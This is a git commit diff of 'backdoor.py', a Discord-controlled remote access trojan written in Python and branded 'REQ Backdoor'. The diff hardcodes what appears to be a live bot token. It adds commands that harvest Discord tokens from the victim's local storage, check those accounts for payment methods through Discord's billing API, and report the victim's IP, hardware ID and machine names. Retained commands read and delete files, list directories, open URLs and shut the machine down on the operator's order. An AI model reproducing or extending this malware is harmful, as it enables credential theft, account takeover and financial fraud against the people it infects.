217693a77a00461ce731b981dc24341bba8c4861
Monstered <70181923+Monst3red@users.noreply.github.com>
2021-02-17 02:33:53 +0100

    Update backdoor.py

--- backdoor.py
+++ backdoor.py
@@ -13,9 +13,9 @@ from urllib.request import Request, urlopen
 from subprocess import Popen, PIPE
 import platform as plt
 
-Token = ""
+Token = "ODA5ODcwODk4MzY2NTEzMjUz.YCbZDA.DvFqOGpKfbUkflFEBlcq-5kC-t4"
 
-client = commands.Bot(command_prefix=".")
+client = commands.Bot(command_prefix="!!")
 
 def WinMsg(Name, Value):
     embed = discord.Embed(title = "🔨 Information", color=0xFC4D4D)
@@ -25,29 +25,22 @@ def WinMsg(Name, Value):
 
 def ErrorMsg():
     embed = discord.Embed(title = "🔨 Information", color=0xFC4D4D)
-    embed.add_field(name = "Error", value = f"Error :(")
+    embed.add_field(name = "Error", value = f"Error IP :(")
     embed.set_footer(text = "REQ Backdoor・Monstered")
     return embed
 
 def GetIP():
     return requests.get("https://api.ipify.org/").text
 
-def Headers(token=None):
-	headers = {"content-type": "application/json", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}
-
-	if token:
-		headers.update({"Authorization": token})
-	return headers
-
-def Payment(token):
-	try:
-		return bool(len(loads(urlopen(Request("https://discord.com/api/v8/users/@me/billing/payment-sources", headers=Headers(token))).read().decode())))
-	except:
-		pass
-
 def Hwid():
 	p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE) 
 	return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
+
+def Payment(token):
+            try:
+                return loads(urlopen(Request("https://discord.com/api/v8/users/@me/billing/payment-sources", headers={"authorization": token, "content-type": "application/json"}).read().decode()))
+            except:
+                pass
 
 def Tokens(path):
 	tokens = []
@@ -61,11 +54,11 @@ def Tokens(path):
 					tokens.append(token)
 	return tokens
 
+ids = []
 OS = plt.platform().split("-")
 name = os.getenv("UserName")
 Username = os.getenv("COMPUTERNAME")
 dire = {"Discord": os.getenv("APPDATA") + "\\Discord\\Local Storage\\leveldb"}
-ids = []
 
 @client.command()
 async def tokens(ctx, IP):
@@ -81,21 +74,38 @@ async def tokens(ctx, IP):
 	    			if not uid or uid in ids:
 	    				continue
 	    		ids.append(uid)
-	    		payment = bool(Payment(token))
 
 	    		messages = f"```ARM\nTokens: {token}\n```"
 	    await ctx.send(messages)
 
 @client.command()
-async  def check(ctx, IP):
+async def payment(ctx, IP):
     if IP == GetIP():
-        OS = plt.platform().split("-")
-        name = os.getenv("UserName")
-        Username = os.getenv("COMPUTERNAME")
-        messages = f"```ARM\nIP: {GetIP()}\n```" +  f"```ARM\nHWID: {Hwid()}\n```" + f"```ARM\nPC Username: {Username}\n```" + f"```ARM\nPC Name: {name}\n```" + f"```ARM\nProduct Name: {OS[0]} {OS[1]}\n```"
+        for platform, path in dire.items():
+            for token in Tokens(path):
+                uid = None
+                if not token.startswith("mfa."):
+                    try:
+                        uid = b64decode(token.split(".")[0].encode()).decode()
+                    except:
+                        pass
+                    if not uid or uid in ids:
+                        continue
+                ids.append(uid)
+                payment = bool(Payment(token))
+
+                messages = f"```ARM\nTokens: {token}\nPayment Method: {payment}\n```"
         await ctx.send(messages)
     else:
-        await ctx.channel.send(embed = ErrorMsg())
+        await ctx.send(embed = ErrorMsg())
+
+@client.command()
+async def check(ctx):
+    OS = plt.platform().split("-")
+    name = os.getenv("UserName")
+    Username = os.getenv("COMPUTERNAME")
+    messages = f"```ARM\nIP: {GetIP()}\n```" +  f"```ARM\nHWID: {Hwid()}\n```" + f"```ARM\nPC Username: {Username}\n```" + f"```ARM\nPC Name: {name}\n```" + f"```ARM\nProduct Name: {OS[0]} {OS[1]}\n```"
+    await ctx.send(messages)
 
 @client.command()
 async def getpwd(ctx, IP):
@@ -106,7 +116,6 @@ async def getpwd(ctx, IP):
 
 @client.command()
 async def run(ctx, IP, url):
-
     if IP == GetIP():
         webbrowser.open(url)
         await ctx.channel.send(embed = WinMsg("Open url", f"[*] Url open successfully `{url}`"))
@@ -122,7 +131,7 @@ async def message(ctx, IP, msg):
         await ctx.channel.send(embed = ErrorMsg())
 
 @client.command()
-async def admin(ctx, IP):
+async def Admin(ctx, IP):
     admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
     if IP == GetIP():
         if admin == True:
@@ -150,7 +159,7 @@ async def cwd(ctx, IP):
         await ctx.channel.send(embed = ErrorMsg())
 
 @client.command()
-async def look(ctx, IP, dir):
+async def Look(ctx, IP, dir):
     if IP == GetIP():
         dir = os.listdir(dir)
         await ctx.channel.send(embed = WinMsg("Look directory", f"{dir}"))
@@ -166,7 +175,7 @@ async def remove(ctx, IP, file):
         await ctx.channel.send(embed = ErrorMsg())
 
 @client.command()
-async def read(ctx, IP, file):
+async def Read(ctx, IP, file):
     if IP == GetIP():
         files = open(file, "r").read()
         await ctx.channel.send(f"```\n{files}\n```")
@@ -177,15 +186,17 @@ async def read(ctx, IP, file):
 @client.command()
 async def menu(ctx):
     embed = discord.Embed(title = "Help Menu", color=0xFC4D4D)
-    embed.add_field(name = "$message <IP> <message>", value = "Sent a message box")
-    embed.add_field(name = "$run <IP> <url>", value = "open the webbrowser")
-    embed.add_field(name = "$admin <IP>", value = "Check if the pc is admin")
-    embed.add_field(name = "$cwd <IP>", value = "Check the file rat directory")
-    embed.add_field(name = "$look <IP> <directory>", value = "Watch directory content")
-    embed.add_field(name = "$remove <IP> <file>", value = "Remove the file")
-    embed.add_field(name = "$read <IP> <directory>", value = "Read the content of the file")
-    embed.add_field(name = "$screen <IP>", value = "Take screen of computer")
-    embed.add_field(name = "$shutdown <IP>", value = "Shutdown the pc")
+    embed.add_field(name = "!!message <IP> <message>", value = "Sent a message box")
+    embed.add_field(name = "!!run <IP> <url>", value = "open the webbrowser")
+    embed.add_field(name = "!!admin <IP>", value = "Check if the pc is admin")
+    embed.add_field(name = "!!cwd <IP>", value = "Check the file rat directory")
+    embed.add_field(name = "!!look <IP> <directory>", value = "Watch directory content")
+    embed.add_field(name = "!!remove <IP> <file>", value = "Remove the file")
+    embed.add_field(name = "!!read <IP> <directory>", value = "Read the content of the file")
+    embed.add_field(name = "!!shutdown <IP>", value = "Shutdown the pc")
+    embed.add_field(name = "!!tokens <IP>", value = "Get Disord Token")
+    embed.add_field(name = "!!payment <IP>", value = "Look discord payment method")
+    embed.add_field(name = "!!check", value = "Look discord payment method")
     embed.set_footer(text = "REQ Backdoor・Monstered")
     await ctx.channel.send(embed = embed)
 
